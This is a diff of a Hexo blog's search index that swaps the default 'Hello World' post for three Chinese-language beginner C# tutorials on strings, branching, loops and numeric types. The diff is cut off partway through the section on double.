@@ -1,21 +1,1801 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2023/12/28/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>C shorp 基础(一)</title>
+    <url>/2023/07/07/C-shorp-%E5%9F%BA%E7%A1%80-%E4%B8%80/</url>
+    <content><![CDATA[<h1 id="运行第一个C-程序"><a href="#运行第一个C-程序" class="headerlink" title="         运行第一个C#程序"></a><span style="color:green">         运行第一个C#程序</span></h1><p>在代码编辑器如**<code>visual studio</code>**中运行以下代码。</p>
+<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">Console.WriteLine(<span class="string">&quot;Hello World!&quot;</span>);</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>这是一个简单的程序，可以打印消息“Hello World！”</p>
+<figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/xg52OMRn.png"
+                      alt="输出hello" style="zoom:50%;" 
+                ><figcaption>输出hello</figcaption></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<div style="text-align:center; font-size:small">如果成功输出了“Hello World！”  👍</div>
+
+<div style="text-align:center; font-size:small">那么现在可以把是一名程序员写在简历上😉</div>
+
+<p>这句代码使用了 <code>Console.WriteLine</code> 方法来打印该消息。<code>Console</code> 是表示控制台窗口的类型。<br><code>WriteLine</code> 是 <code>Console</code> 类型的一个使用方法，用于将一行文本打印到文本控制台。<br><code>string</code>在C#中表示文本。与<code>Console</code>类似，<code>string</code>也有使用方法。接下来是用<code>string</code>处理文本。</p>
+<h1 id="声明和使用变量"><a href="#声明和使用变量" class="headerlink" title="声明和使用变量"></a>声明和使用变量</h1><p>第一个程序仅限于打印一条消息。可以通过变量来快速改变输出内容。<br>运行以下代码：</p>
+<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> aFriend = <span class="string">&quot;Chieh&quot;</span>;</span><br><span class="line">Console.WriteLine(aFriend);</span><br></pre></td></tr></table></figure></div>
+
+<p>第一行声明一个<code>aFriend</code>变量，并为其赋值为“<code>Chieh</code>”。第二行 打印出<code>aFriend</code>的值</p>
+<p>可以为声明的任何变量分配不同的值。比如将值更改为你的朋友之一。在已经添加的代码后面，在交互窗口中添加以下两行代码。请确保保留变量 <code>aFriend</code> 的声明和初始赋值。</p>
+<ul>
+<li>不要删除<code>aFriend</code>的声明。在现有的声明后面修改成以下代码。</li>
+</ul>
+<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">aFriend = <span class="string">&quot;Xuxu&quot;</span>;</span><br><span class="line">Console.WriteLine(aFriend);</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>请注意，如果调用同一个变量那么需要注意变量值的变化。</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/Iaf4OLwP.png"
+                      style="zoom:50%;" 
+                >
+
+<p>不难看出，最后缺少消息中缺少了“Hello”这个词。现在来修复这个问题:将打印消息的代码修改为以下内容：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">Console.WriteLine(<span class="string">&quot;Hello &quot;</span> + aFriend);</span><br></pre></td></tr></table></figure></div>
+
+<p>再次运行程序</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/HvZjfUQy.png"
+                      style="zoom:50%;" 
+                >
+
+<p>真不错，不过更好的方法是在和字符之间放置一个变量，告诉 C# 用变量的值替换该文本。<br>方法是<code>&#123; &#125;</code>，称为<a class="link"   href="https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/tokens/interpolated" >字符串插值 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>如果在字符串的引号前添加 <code>$</code> 符号，您可以在大括号内包含符号，如<code>aFriend</code>。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/IKiRrJLj.png"
+                      style="zoom:50%;" 
+                >
+
+<h1 id="使用字符串"><a href="#使用字符串" class="headerlink" title="使用字符串"></a>使用字符串</h1><p>并不仅限于在大括号之间使用一个变量。试试这个好东西:</p>
+<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> firstFriend = <span class="string">&quot;Chieh&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> secondFriend = <span class="string">&quot;Xuxu&quot;</span>;</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;我的朋友是 <span class="subst">&#123;firstFriend&#125;</span> 和 <span class="subst">&#123;secondFriend&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/S7vKKdAK.png"
+                      style="zoom: 50%;" 
+                >
+
+<p><span style="color:green"> <strong>看，你现在有了两个好朋友</strong>。😉</span></p>
+<p><strong>字符串不仅仅是字母的集合。</strong>你可以使用<code>Length</code>来找到一个字符串的长度。<br><code>Length</code>是一个字符串的属性，它会返回该字符串中的字符数量。试试以下代码：</p>
+<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">Console.WriteLine(<span class="string">$&quot;名字 <span class="subst">&#123;firstFriend&#125;</span> 有 <span class="subst">&#123;firstFriend.Length&#125;</span> 字符.&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;名字 <span class="subst">&#123;secondFriend&#125;</span> 有 <span class="subst">&#123;secondFriend.Length&#125;</span> 字符.&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/j9V1InuE.png"
+                      style="zoom:50%;" 
+                >
+
+<h1 id="使用字符串做更多事情"><a href="#使用字符串做更多事情" class="headerlink" title="使用字符串做更多事情"></a>使用字符串做更多事情</h1><p>你一直在使用一个方法，即<code>Console.WriteLine</code>，来打印消息。下面是是实现某种输出操作的<code>代码块</code>。</p>
+<h2 id="修剪"><a href="#修剪" class="headerlink" title="修剪"></a>修剪</h2><p>假设输出的字符串中 ，有不想显示的前导或尾随空格。那么如何<strong>修剪</strong>字符串中的空格嘞？</p>
+<ul>
+<li><a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.string.trim" >Trim <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：删除全部空格</li>
+<li><a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.string.trimstart?view=net-7.0" >TrimStart <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：删除前导空格</li>
+<li><a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.string.trimend?view=net-7.0" >TrimEnd <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：删除尾随空格。</li>
+</ul>
+<p>举个例子：</p>
+<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> greeting = <span class="string">&quot;      Cheih       &quot;</span>;</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;[<span class="subst">&#123;greeting&#125;</span>]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> trimmedGreeting = greeting.TrimStart();</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;[<span class="subst">&#123;trimmedGreeting&#125;</span>]&quot;</span>);</span><br><span class="line"></span><br><span class="line">trimmedGreeting = greeting.TrimEnd();</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;[<span class="subst">&#123;trimmedGreeting&#125;</span>]&quot;</span>);</span><br><span class="line"></span><br><span class="line">trimmedGreeting = greeting.Trim();</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;[<span class="subst">&#123;trimmedGreeting&#125;</span>]&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/tL3r2jWm.png"
+                      style="zoom:50%;" 
+                >
+
+<h2 id="替换和查找字符串"><a href="#替换和查找字符串" class="headerlink" title="替换和查找字符串"></a>替换和查找字符串</h2><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p>你可能在编辑器里或Office里使用过查找和替换命令。<a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.string.replace" >Replace <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 方法在字符串中实现了类似的功能。</p>
+<ul>
+<li>它会搜索一个子字符串并用不同的文本替换它。</li>
+<li><a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.string.replace" >Replace <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 方法需要两个<strong>参数</strong>。括号里第一个参数是要<strong>查找的文本</strong>，第二个参数是要<strong>替换的文本</strong>。</li>
+</ul>
+<p>举个例子：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> sayHello = <span class="string">&quot;Hi Chieh!&quot;</span>;</span><br><span class="line">Console.WriteLine(sayHello);</span><br><span class="line">sayHello = sayHello.Replace(<span class="string">&quot;Chieh&quot;</span>, <span class="string">&quot;Xuxu&quot;</span>);</span><br><span class="line">Console.WriteLine(sayHello);</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/jkzCaDPM.png"
+                      style="zoom:50%;" 
+                >
+
+<p>还有两个有用的方法可以让字符串全部大写或全部小写：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">Console.WriteLine(sayHello.ToUpper());</span><br><span class="line">Console.WriteLine(sayHello.ToLower());</span><br></pre></td></tr></table></figure></div>
+
+<p>替换变量值后原变量的值也会被替换，<strong>需要注意输出语句和变量值的位置关系</strong>：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/DFd7NuJB.png"
+                      style="zoom:50%;" 
+                >
+
+<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p>搜索和替换操作的另一部分是在字符串中查找文本。<br>您可以使用 <a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.string.contains" >Contains <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>方法进行搜索。它告诉您字符串内部是否包含子字符串。使用以下代码来探索<a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.string.contains" >Contains <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> songLyrics = <span class="string">&quot;今天天气很不错, 出去玩吗？&quot;</span>;</span><br><span class="line">Console.WriteLine(songLyrics.Contains(<span class="string">&quot;天气&quot;</span>));</span><br><span class="line">Console.WriteLine(songLyrics.Contains(<span class="string">&quot;晴天&quot;</span>));</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>Contains方法只会返回一个布尔值，告诉你是否找到了你正在搜索的字符串。</li>
+<li>布尔值存储的是真或假两种值。当作为文本输出时，它们分别为：True 和 False。</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/06/Rx9dLulV.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li>当测试字符串末尾的文本时，请注意标点符号。</li>
+<li>如果字符串以句点结尾，则必须检查是否有以句点结尾的字符串。</li>
+</ul>
+<h1 id="到此已经学会了："><a href="#到此已经学会了：" class="headerlink" title="到此已经学会了："></a><span style="color:Gold">到此已经学会了：</span></h1><p><span style="color:green">         使用 <code>Console.WriteLine()</code> 将文本显示在屏幕上。</span></p>
+<p><span style="color:green">         如何声明变量和将字符串们串联在一起。</span></p>
+<p><span style="color:green">         使用字符串做更多事情。</span></p>
 ]]></content>
+      <tags>
+        <tag>C shorp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C shorp 基础(三)</title>
+    <url>/2023/07/07/C-shorp-%E5%9F%BA%E7%A1%80-%E4%B8%89/</url>
+    <content><![CDATA[<h1 id="使用分支和循环语句"><a href="#使用分支和循环语句" class="headerlink" title="         使用分支和循环语句"></a><span style="color:orange">         使用分支和循环语句</span></h1><p>这篇内容为：如何编写检查变量并根据这些变量更改执行路径的代码。</p>
+<h2 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a><code>if</code> 语句</h2><p>在编辑器中运行以下代码。</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">int</span> b = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">if</span> (a + b &gt; <span class="number">10</span>)</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;答案大于 10.&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/6qFG6yoy.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li>修改变量的值，不难发现如果答案小于 10将不会输出任何内容。因为不符合<code>if</code>语句的判断条件。</li>
+<li>因为只编写了语句的可能分支之一：<code>真实分支</code>。那么当判断为假的情况下将没有任何代码要执行</li>
+</ul>
+<h2 id="else-语句"><a href="#else-语句" class="headerlink" title="else 语句"></a><code>else</code> 语句</h2><p>要在 true 和 false 分支中执行不同的代码，您可以创建一个<code>else</code>在条件为 false 时执行的分支。尝试这个：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">int</span> b = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (a + b &gt; <span class="number">10</span>)</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;答案大于 10&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    Console.WriteLine(<span class="string">&quot;答案小于 10&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/Ht3dd6PX.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li><p><code>else</code>只会在<code>if判断</code>为假时执行，可以理解为中文语境里的<code>if</code>&#x3D;<code>如果</code>，<code>else</code>&#x3D;<code>否则</code></p>
+</li>
+<li><p><code>if</code>和<code>else</code>语句下的缩进是为了方便代码的可读性。C#本身不太在意缩进或空白。因为在<code>if</code>或<code>else</code>关键词后的语句会根据条件执行。</p>
+</li>
+</ul>
+<p>因为缩进并不重要，所以你需要使用 <code>&#123;</code>  和  <code>&#125; </code>来表示想要有多个语句成为条件执行块的一部分。通常来说在所有的<code>if</code>和<code>else</code>上都会使用这些大括号。下面的例子可以试试看。</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">int</span> b = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">int</span> c = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span> ((a + b + c &gt; <span class="number">10</span>) &amp;&amp; (a == b))</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;答案大于 10&quot;</span>);</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;或者a和b的数字相等&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;答案不大于 10&quot;</span>);</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;或者a和b的数字不相等&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>输出结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/eL7ypy3o.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li>该<code>if</code>语句里的<code>==</code>符号代表变量值相等</li>
+<li>代码里    <code>&amp;&amp; </code>   代表 “和” 。也就是两个条件都必须满足才能执行 true 分支中的语句</li>
+<li>另外还有  <code>||</code>  表示 “或” 。也就是两个条件满足任意一个即可执行 true 分支的语句</li>
+<li>每个条件分支中可以有多个语句，前提是将它们在<code>&#123;   &#125;</code>里</li>
+</ul>
+<h2 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a><code>while</code>语句</h2><p>创建程序的另一个重要概念是<strong>循环</strong>。使用循环来重复想要多次执行的语句。试试以下代码：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (counter &lt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;计数器数字为 ： <span class="subst">&#123;counter&#125;</span>&quot;</span>);</span><br><span class="line">  counter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>while</code>语句会检查条件并执行 后面的语句，直到条件为假为止。<br>此示例中还有另一个新运算符。  <code>++</code>   是<strong>增量</strong>运算符。它将 <code>counter</code> 的值加 1，并将该值存储在 <code>counter</code> 变量中。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/o5YvHSbs.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li><strong>注意：确保<code>while</code>在执行代码时循环条件确实切换为 false。否则，将创建一个 无限循环，程序永远不会结束。</strong></li>
+</ul>
+<h2 id="do-while语句"><a href="#do-while语句" class="headerlink" title="do..while语句"></a><code>do..while</code>语句</h2><p>与while循环不同</p>
+<ul>
+<li>do while循环需要循环体<code>&#123;   &#125;</code>里的内容至少执行一次在进行判断，无论条件最终值是否为真。</li>
+<li>while循环在执行循环体之前会首先判断条件。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;计数器数字为： <span class="subst">&#123;counter&#125;</span>&quot;</span>);</span><br><span class="line">  counter++;</span><br><span class="line">&#125; <span class="keyword">while</span> (counter &lt; <span class="number">10</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>输出结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/y5FLSifR.png"
+                      style="zoom:50%;" 
+                >
+
+<h2 id="for-语句"><a href="#for-语句" class="headerlink" title="for 语句"></a><code>for</code> 语句</h2><p>在 C# 代码中看到的另一个常见循环语句是 <code>for</code>循环。尝试以下代码：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> counter = <span class="number">0</span>; counter &lt; <span class="number">10</span>; counter++)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;计数器数字为： <span class="subst">&#123;counter&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>第一部分是<strong>for 初始化</strong>程序：<code>int counter = 0;</code>声明了一个名字为<code>counter</code>的循环变量，并赋值设置为<code>0</code>。</li>
+<li>中间部分是<strong>for条件</strong>：<code>counter &lt; 10</code>声明 ，只要<code>counter</code>的值小于10，这个<code>for</code>循环就继续执行。</li>
+<li>最后一部分是<strong>for 迭代器</strong>：<code>counter++</code>指进行<code>for</code>循环时<code>counter</code>每次变量值时应该增加 1。</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/KvlAaFcz.png"
+                      style="zoom:50%;" 
+                >
+
+<h2 id="循环体"><a href="#循环体" class="headerlink" title="循环体"></a>循环体</h2><p><code>while</code>、<code>do</code>、 或<code>for</code>循环可以嵌套在另一个循环中，以使用外循环中的每个项目与内循环中的每个项目的组合来创建矩阵。<br>下面的代码可以生成1-10的数字：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> row = <span class="number">1</span>; row &lt; <span class="number">11</span>; row++)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;row的值为：  <span class="subst">&#123;row&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>下面的代码可以生成a-j的字母：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">char</span> column = <span class="string">&#x27;a&#x27;</span>; column &lt; <span class="string">&#x27;k&#x27;</span>; column++)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;column 的值为： <span class="subst">&#123;column&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>下面将一个上面的循环嵌套在另一个循环中以形成矩阵：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> row = <span class="number">1</span>; row &lt; <span class="number">11</span>; row++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">char</span> column = <span class="string">&#x27;a&#x27;</span>; column &lt; <span class="string">&#x27;k&#x27;</span>; column++)</span><br><span class="line">  &#123;</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;矩阵为： (<span class="subst">&#123;row&#125;</span>, <span class="subst">&#123;column&#125;</span>)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/cG9WwKW9.png"
+                      style="zoom:50%;" 
+                >
+
+<p>每次完整运行内循环时，外循环都会递增一次。</p>
+<h1 id="到此已经学会了："><a href="#到此已经学会了：" class="headerlink" title="到此已经学会了："></a><span style="color:Gold">到此已经学会了：</span></h1><p><span style="color:green">         使用 <code>Console.WriteLine()</code> 将文本显示在屏幕上。</span></p>
+<p><span style="color:green">         如何声明变量和将字符串们串联在一起。</span></p>
+<p><span style="color:green">         字符串的修改方法。</span></p>
+<p><span style="color:blue">         C#的运算逻辑。</span></p>
+<p><span style="color:blue">         数据类型的区别和精度。</span></p>
+<p><span style="color:orange">         分支和循环语句。</span></p>
+<p><span style="color:orange">         循环体。</span></p>
+]]></content>
+      <tags>
+        <tag>C shorp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C shorp 基础(二)</title>
+    <url>/2023/07/07/C-shorp-%E5%9F%BA%E7%A1%80-%E4%BA%8C/</url>
+    <content><![CDATA[<h1 id="在-C-中操作整数和浮点数。"><a href="#在-C-中操作整数和浮点数。" class="headerlink" title="         在 C# 中操作整数和浮点数。"></a><span style="color:blue">         在 C# 中操作整数和浮点数。</span></h1><h2 id="int类型"><a href="#int类型" class="headerlink" title="int类型"></a><code>int</code>类型</h2><p>在编辑器中运行以下代码。</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a = <span class="number">18</span>;</span><br><span class="line"><span class="built_in">int</span> b = <span class="number">6</span>;</span><br><span class="line"><span class="built_in">int</span> c = a + b;</span><br><span class="line"><span class="built_in">int</span> d = a - b;</span><br><span class="line"><span class="built_in">int</span> e = a * b;</span><br><span class="line"><span class="built_in">int</span> f = a / b;</span><br><span class="line">Console.WriteLine(c);</span><br><span class="line">Console.WriteLine(d);</span><br><span class="line">Console.WriteLine(e);</span><br><span class="line">Console.WriteLine(f);</span><br></pre></td></tr></table></figure></div>
+
+<p>这是整数的基本数学运算之一。该<code>int</code>类型表示一个<strong>整数</strong>、正整数或负整数。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/Il58QcEG.png"
+                      style="zoom:50%;" 
+                >
+
+<p>C# 语言定义了不同数学运算的优先级，其规则与数学规则一致。<strong>乘法和除法优先于加法和减法</strong>。可以通过在要首先执行的一个或多个操作周围<strong>添加括号来强制执行不同的操作顺序</strong></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/OIDjy7IH.png"
+                      style="zoom:50%;" 
+                >
+
+<p>即使您希望结果包含小数或小数部分但<strong>整数除法始终会产生整数结果</strong>，可以使用<strong>余数运算符</strong>获得余数。字符：<code>%</code></p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a = <span class="number">7</span>;</span><br><span class="line"><span class="built_in">int</span> b = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">int</span> c = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">int</span> d = (a + b) / c;</span><br><span class="line"><span class="built_in">int</span> e = (a + b) % c;</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;整数: <span class="subst">&#123;d&#125;</span>&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;余数: <span class="subst">&#123;e&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/IzZlUHU1.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li><code>int</code>类型具有最小和最大限制，范围是    <strong>-2147483648</strong>   至   <strong>2147483647</strong></li>
+<li>计算产生的值超出这些限制，则出现<strong>下溢</strong>或<strong>溢出</strong>情况。</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/i2X29a9N.png"
+                      style="zoom:50%;" 
+                >
+
+<p>输出结果非常接近最小（负）整数。它相当于<code>最小值 + 2</code>。</p>
+<h2 id="double类型"><a href="#double类型" class="headerlink" title="double类型"></a><code>double</code>类型</h2><p><code>int</code>类型不能满足需求时，可以使用具有不同限制和精度的其他数字类型，**<code>double</code>类型<strong>表示双精度浮点数，</strong>双精度<strong>是一个相对术语，描述用于存储值的二进制位数。</strong>双精度** 数的二进制位数是<strong>单精度</strong>数的两倍。在现代计算机上，使用双精度数字比使用单精度数字更常见。<strong>单精度</strong>数字使用<code>float</code>关键字声明。</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">double</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">double</span> b = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">double</span> c = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">double</span> d = (a + b) / c;</span><br><span class="line">Console.WriteLine(d);</span><br></pre></td></tr></table></figure></div>
+
+<p>输出结果：</p>
